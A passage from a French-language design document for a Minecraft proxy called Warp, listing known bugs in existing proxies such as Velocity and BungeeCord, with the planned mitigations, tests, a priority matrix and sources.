- LuckPerms, BungeeTabListPlus, BuycraftX tous affectes

**Mitigation Warp** :
- **Garantie stricte** : pour un meme UUID, DisconnectEvent(ancien) COMPLETE avant que LoginEvent(nouveau) commence
- Serialisation par UUID (pas globale) pour ne pas bloquer les autres joueurs
- Evenements avec un champ `sessionId` unique pour distinguer les sessions

**Test** :
- Bot qui se connecte, se deconnecte, et se reconnecte en < 100ms, 1000 fois
- Verifier qu'aucun etat n'est corrompu
- Plugin de test qui ecrit/lit un compteur dans LoginEvent et DisconnectEvent

---

### 8.2 Scoreboard et boss bar leak entre serveurs

**Description** : Le scoreboard et les boss bars sont des etats cote client. Quand un joueur switch de serveur, l'ancien serveur ne peut pas envoyer de paquets "remove". Si le proxy ne nettoie pas ces etats, le joueur voit les boss bars et scores de l'ancien serveur superposer ceux du nouveau.

**Comment les proxys existants echouent** :
- Le plugin TAB a du fixer une "duplication de bossbar au switch serveur sur Velocity, causee par un bug Velocity"
- BungeeCord ne nettoie pas le scoreboard au switch

**Mitigation Warp** :
- Au switch serveur : envoyer les paquets de suppression pour tous les objectifs de scoreboard et boss bars connus
- Tracker d'etat leger : garder une liste des boss bars et objectifs actifs par joueur
- Reset des teams et des joueurs dans le scoreboard

**Test** :
- Serveur A avec boss bar + scoreboard, switch vers serveur B, verifier l'absence de fantomes
- Switch rapide A -> B -> A -> B, verifier la coherence

---

### 8.3 Entity ID : collision et gestion au switch

**Description** : Chaque serveur assigne un entity ID au joueur. Quand le joueur switch de serveur, le nouvel entity ID peut etre different. Le proxy doit soit reecrire les entity IDs dans tous les paquets (BungeeCord approach), soit forcer le client a adopter le nouvel ID.

**Comment les proxys existants echouent** :
- BungeeCord/LilyPad : reecrivent les entity IDs dans les paquets, ce qui est complexe et source de bugs
- Velocity : utilise une approche plus elegante : envoyer JoinGame avec le nouvel ID + 2 Respawn packets (dimension differente puis retour)

**Mitigation Warp** :
- Suivre l'approche Velocity : pas de reecriture d'entity ID
- Envoyer JoinGame non modifie du nouveau serveur
- Double Respawn pour forcer le reset du monde client

**Test** :
- Switch serveur et verifier que l'entity ID client est correct
- Verifier que les autres entites (mobs, joueurs) sont correctement affichees apres le switch
- Switch rapide entre 3+ serveurs

---

### 8.4 Resource pack : etat corrompu au switch

**Description** : Les resource packs sont un etat cote client. Si serveur A envoie un pack et le joueur switch vers serveur B (pas de pack), le pack de A reste charge. Si B envoie un pack different, le client doit telecharger et appliquer. Pendant le telechargement, le joueur voit des textures manquantes.

**Comment les proxys existants echouent** :
- Les joueurs doivent retelecharger le meme pack en switchant entre serveurs qui utilisent le meme pack
- Le plugin VelocityResourcePacks tente de resoudre ca mais c'est fragile

**Mitigation Warp** :
- Tracker de resource pack par joueur : savoir quel pack est actuellement charge
- Ne pas renvoyer le meme pack si deja charge (comparer hash)
- Option "pack global proxy" pour eviter les retelechargementes au switch

**Test** :
- Switch entre serveur avec pack A -> serveur avec pack A (pas de retelechargemento)
- Switch entre serveur avec pack A -> serveur avec pack B (telechargement)
- Switch vers serveur sans pack (le pack precedent reste-t-il? doit-on le supprimer?)

---

### 8.5 Cookie corruption dans le Transfer Packet flow

**Description** : Les cookies (1.20.5+) stockent des donnees arbitraires sur le client, persistees entre transfers. Le client vanilla limite les cookies a 5 KiB. Les cookies sont transmis pendant le handshake apres un transfer. Si un cookie est corrompu ou trop gros, le transfer echoue silencieusement.

**Comment les proxys existants echouent** :
- TransferProxy a du ameliorer les "cookie methods and validation" dans sa v1.0.6
- Pas de standard pour le format des cookies entre differents proxys

**Mitigation Warp** :
- Validation des cookies en entree : taille, format, signature
- Limite configurable de taille cookie (defaut 5 KiB comme vanilla)
- API pour les plugins pour lire/ecrire des cookies de maniere type-safe
- Pas de cookies pour les donnees sensibles (pas de confiance cote client)

**Test** :
- Transfer avec cookie valide, cookie trop gros, cookie corrompu
- Transfer entre deux instances Warp (verifier la preservation)
- Transfer depuis un serveur non-Warp (verifier la compatibilite)

---

### 8.6 Plugin message ordering (Velocity #1560)

**Description** : Le bus d'evenements de Velocity execute tous les handlers de maniere asynchrone par defaut. L'ordre d'observation des evenements est donc indefini. Meme `async=false` dans `@Subscribe` ne garantit pas l'ordre si des handlers de priorite plus haute sont asynchrones.

**Comment les proxys existants echouent** :
- Velocity : "nearly impossible to guarantee plugin messages will be observed in the correct order"
- Impact direct : les protocols qui necessitent un traitement sequentiel (voice chat, synchronisation) sont casses

**Mitigation Warp** :
- Les handlers de plugin messages sont executes dans l'ordre de reception PAR DEFAUT
- Option explicite pour le traitement asynchrone (opt-in, pas opt-out)
- API dediee pour les plugin messages avec garantie d'ordre par channel

**Test** :
- Plugin de test qui envoie 100 messages numerotes et verifie l'ordre de reception
- Tester avec plusieurs handlers sur le meme channel

---

## 9. Timezone, Locale et Horloge

### 9.1 Derive d'horloge et KeepAlive

**Description** : Le protocole MC KeepAlive envoie un ID que le client doit renvoyer. Le proxy et le backend ont chacun leurs propres keepalive. Si l'horloge systeme derive (containers Docker, VMs), les timeouts peuvent se declencher de maniere erronee.

**Comment les proxys existants echouent** :
- `System.nanoTime()` peut deriver par rapport a `currentTimeMillis()` (JDK-8338732)
- Dans Docker, la JVM peut utiliser GMT alors que le host est en CDT, causant un decalage de 5h dans les logs

**Mitigation Warp** :
- Utiliser `System.nanoTime()` pour les mesures de duree (monotone, pas affecte par NTP)
- Ne JAMAIS utiliser `System.currentTimeMillis()` pour les timeouts
- Logger les timestamps en UTC avec indication explicite du fuseau
- Detecter les derives excessives entre nano et millis et log WARNING

**Test** :
- Changer le fuseau horaire du conteneur pendant l'execution
- Simuler un saut d'horloge NTP de 5 secondes
- Verifier que les keepalive ne deconnectent pas les joueurs apres un ajustement d'horloge

---

### 9.2 Locale et formatage de strings

**Description** : `String.format()` en Java utilise la locale par defaut pour formatter les nombres. En locale turque, `"I".toLowerCase()` retourne "i" (sans point), pas "i". Les flottants utilisent la virgule au lieu du point dans certaines locales.

**Comment les proxys existants echouent** :
- Bug subtil et rare, mais catastrophique quand il arrive (les messages MOTD avec des chiffres affichent des virgules au lieu de points)

**Mitigation Warp** :
- Forcer `Locale.ROOT` ou `Locale.US` pour tout le formatage interne
- Ne jamais utiliser la locale systeme par defaut
- Validation au demarrage de la locale courante

**Test** :
- Lancer avec `LANG=tr_TR.UTF-8` et verifier que tout fonctionne
- Tester les MOTD avec des nombres

---

## 10. Mise a Jour et Rollback

### 10.1 Mojang release un mardi : protocol mismatch

**Description** : Quand Mojang sort une nouvelle version, les joueurs mettent a jour immediatement mais les serveurs non. Le proxy recoit des clients avec le nouveau protocol version qui ne matchent aucun backend. Les snapshots/pre-releases utilisent des protocol versions > 0x40000000 (1073741825+).

**Comment les proxys existants echouent** :
- Le message d'erreur est cryptique ("Outdated server!")
- Pas de moyen natif de gerer des backends de versions differentes sans ViaVersion
- Les packet IDs changent entre versions (Keep Alive a change entre 1.21.8 et 1.21.9)

**Mitigation Warp** :
- Message d'erreur personnalisable par version client non supportee
- Detection des protocol versions snapshot (> 0x40000000) avec message specifique
- Support natif du mixed-version backend (router par version client)
- Mode "maintenance" : bloquer les connexions avec un message custom pendant la mise a jour

**Test** :
- Connecter avec un client snapshot a un proxy qui ne supporte que les releases
- Verifier le message d'erreur
- Tester le routing par version vers differents backends

---

### 10.2 Rollback sans downtime

**Description** : Un deploiement de nouvelle version du proxy cause des problemes en production. Il faut pouvoir revenir en arriere sans perdre les connexions des joueurs.

**Comment les proxys existants echouent** :
- Aucun proxy MC ne supporte le hot-reload ou le graceful restart
- Velocity : `SIGTERM` = kick tous les joueurs
- Les grands reseaux utilisent des load balancers avec drain, mais c'est du custom

**Mitigation Warp** :
- Drain multi-phase natif : stopper les nouvelles connexions -> migrer les joueurs existants via Transfer Packet -> shutdown
- Support HAProxy agent-check pour la sante du proxy
- Probes Kubernetes (liveness, readiness, startup)
- Hot-reload de la configuration sans restart

**Test** :
- Simuler un rollback : drain proxy A -> les joueurs migrent vers proxy B -> shutdown A
- Verifier que zero joueur est deconnecte
- Tester le hot-reload de configuration

---

## 11. Garbage Collection et JVM

### 11.1 GC pauses et latence

**Description** : Les pauses GC causent des spikes de latence visibles par les joueurs. Un proxy MC alloue beaucoup d'objets ephemeres (ByteBuf, paquets deserialises, strings). Les pauses G1GC peuvent atteindre 50-200ms, ce qui est perceptible dans un jeu temps reel.

**Comment les proxys existants echouent** :
- Velocity sur GKE : "well over one or two cores" pour quelques joueurs (Steinborn)
- Les flags JVM par defaut ne sont pas optimises pour les proxys MC

**Mitigation Warp** :
- Le blind forwarding reduit massivement les allocations (pas de deserialization = pas d'objets ephemeres)
- Recommander ZGC (pauses < 1ms) pour Java 21+
- Fournir des flags JVM recommandes dans la doc et le script de demarrage
- Minimiser les allocations dans le hot path (pooling de ByteBuf, eviter les String inutiles)
- Monitoring des pauses GC via JMX/Prometheus

**Test** :
- Benchmark avec 1000 bots et G1GC vs ZGC
- Mesurer les pauses GC et la latence P99
- Profiler les allocations dans le hot path avec async-profiler

---

### 11.2 Fuites memoire Netty (Direct Buffer)

**Description** : Netty utilise des direct buffers (hors heap) pour l'I/O. Si un ByteBuf n'est pas `release()` correctement, il fuit. En production, la memoire directe monte progressivement jusqu'a l'OOM. Le transport Epoll a des bugs connus de fuite (netty #13433, #4275).

**Comment les proxys existants echouent** :
- Velocity a eu des fuites de direct buffer reportees en production
- Le message d'erreur est "java.lang.OutOfMemoryError: Direct buffer memory", pas intuitif
- netty #4275 : bug specifique quand EPOLL est utilise avec des exceptions dans `epollInReady`

**Mitigation Warp** :
- Activer `io.netty.leakDetection.level=PARANOID` en dev/test
- Pipeline qui garantit le release de tous les ByteBuf (try-finally systematique)
- Metric Prometheus pour la memoire directe utilisee
- Alerter quand la memoire directe depasse 80% du max
- Tester avec io_uring en plus d'epoll pour eviter les bugs specifiques a epoll

**Test** :
- Test de charge de 24h avec leak detection PARANOID
- Verifier que la memoire directe reste stable
- Simuler des erreurs dans le pipeline et verifier que les buffers sont liberes

---

### 11.3 io_uring instabilite

**Description** : Velocity build 491 ne demarre pas a cause d'un bug dans le transport io_uring de Netty. La solution est `-Dvelocity.disable-iouring-transport`. io_uring est plus performant mais moins mature que epoll.

**Comment les proxys existants echouent** :
- Velocity #1546 : fail to start apres une mise a jour Netty

**Mitigation Warp** :
- Epoll par defaut, io_uring optionnel et desactivable
- Detection automatique des problemes io_uring au demarrage avec fallback sur epoll
- Tests CI sur les deux transports

**Test** :
- Tester le demarrage avec io_uring sur differents kernels Linux
- Benchmark epoll vs io_uring pour valider le gain de performance

---

## Synthese : Matrice de Priorites pour Warp

| Categorie | Impact | Frequence | Priorite Warp |
|-----------|--------|-----------|---------------|
| Blind forwarding (paquets surdimensionnes, compression) | CRITIQUE | Tres frequent | **P0** |
| Race condition Login/Disconnect | CRITIQUE | Frequent | **P0** |
| Drain graceful / zero-downtime | CRITIQUE | Chaque deploiement | **P0** |
| Rate limiting / anti-bot natif | CRITIQUE | Quotidien en prod | **P0** |
| HMAC forwarding (anti UUID spoof) | CRITIQUE | Securite fondamentale | **P0** |
| State machine Configuration (1.20.2+) | CRITIQUE | Chaque connexion | **P0** |
| Chat signe (1.19+) | MAJEUR | Frequent | **P1** |
| Scoreboard/bossbar reset au switch | MAJEUR | Frequent | **P1** |
| File descriptor / ephemeral port detection | MAJEUR | A grande echelle | **P1** |
| Forge/NeoForge handshake passthrough | MAJEUR | Serveurs moddes | **P1** |
| PROXY protocol v1/v2 | MAJEUR | Setups production | **P1** |
| Plugin message ordering | MAJEUR | Plugins avancees | **P1** |
| Entity ID gestion au switch | MAJEUR | Chaque switch | **P1** |
| Keepalive robuste (clock drift) | IMPORTANT | Sporadique | **P2** |
| Resource pack tracking | IMPORTANT | Serveurs avec packs | **P2** |
| Cookie validation (Transfer Packet) | IMPORTANT | Setups Transfer | **P2** |
| IPv6 / Dual-Stack | IMPORTANT | International | **P2** |
| Slowloris / connection exhaustion | IMPORTANT | Attaques ciblees | **P2** |
| GC tuning / direct buffer monitoring | IMPORTANT | Production | **P2** |
| Legacy ping (pre-1.7) | BONUS | Rare | **P3** |
| Locale turque / formatage | BONUS | Tres rare | **P3** |
| io_uring support | BONUS | Performance | **P3** |

---

## Sources

- [Velocity Issues (GitHub)](https://github.com/PaperMC/Velocity/issues)
- [BungeeCord Issues (GitHub)](https://github.com/SpigotMC/BungeeCord/issues)
- [I thought proxying MC would take a weekend. It took 13 days.](https://hypixel.net/threads/i-thought-proxying-minecraft-would-take-a-weekend-it-took-13-days-heres-why.6064963/)
- [Velocity Chronicles Part 0 (Andrew Steinborn)](https://steinborn.me/posts/the-velocity-chronicles-part-0/)
- [Signed Chat and Chat Types (kennytv)](https://gist.github.com/kennytv/ed783dd244ca0321bbd882c347892874)
- [Velocity Concurrency Guarantees (#1013)](https://github.com/PaperMC/Velocity/issues/1013)
- [Velocity Plugin Message Ordering (#1560)](https://github.com/PaperMC/Velocity/issues/1560)
- [Velocity Uncompressed Packet Size (#1556)](https://github.com/PaperMC/Velocity/issues/1556)
- [Velocity 1.8 PvP Client Issue (#527)](https://github.com/PaperMC/Velocity/issues/527)
- [BungeeCord UUID Spoofing Fix](https://www.spigotmc.org/threads/fixing-the-uuid-spoofing-exploit.438812/)
- [BungeeCord IP Forward Bypass](https://github.com/portalBlock/BungeeIPForwardBypass)
- [SoulFire Testing Guide](https://soulfiremc.com/blog/testing-minecraft-proxy-networks)
- [Linux Kernel Tuning for 10k+ Connections](https://dev.to/deepak_mishra_35863517037/performance-tuning-linux-kernel-optimizations-for-10k-connections-lnj)
- [MC Protocol Wiki](https://minecraft.wiki/w/Java_Edition_protocol/Packets)
- [Proxy-Compatible-Forge](https://github.com/adde0109/Proxy-Compatible-Forge)
- [TransferProxy](https://github.com/YvanMazy/TransferProxy)
- [Gate Proxy (Minekube)](https://github.com/minekube/gate)
- [Minecraft Packet Fix](https://github.com/PretendingToCode/Minecraft-Packet-Fix)
- [Netty Direct Buffer Issues (#4275, #13433)](https://github.com/netty/netty/issues/4275)
- [Netty Epoll Memory Leak (#13433)](https://github.com/netty/netty/issues/13433)
- [Hypixel Dev Blog #6 - Keeping up with the Masses](https://hypixel.net/threads/dev-blog-6-keeping-up-with-the-masses.2251554/)
- [Hypixel Network Architecture](https://hypixel.net/threads/simplified-hypixel-network-architecture.4117196/)
- [TCPShield DDoS Protection](https://tcpshield.com/)
- [Cloudflare Slowloris Attack Guide](https://www.cloudflare.com/learning/ddos/ddos-attack-tools/slowloris/)
- [JDK-8338732 nanoTime drift](https://bugs.openjdk.org/browse/JDK-8338732)
- [Node-minecraft-protocol Oversized Packets (#664)](https://github.com/PrismarineJS/node-minecraft-protocol/issues/664)
- [Minecraft Protocol Reverse Proxy (dev.to)](https://dev.to/kiliandeca/we-built-a-minecraft-protocol-reverse-proxy-2e4f)
- [Geyser Common Issues](https://geysermc.org/wiki/geyser/common-issues/)
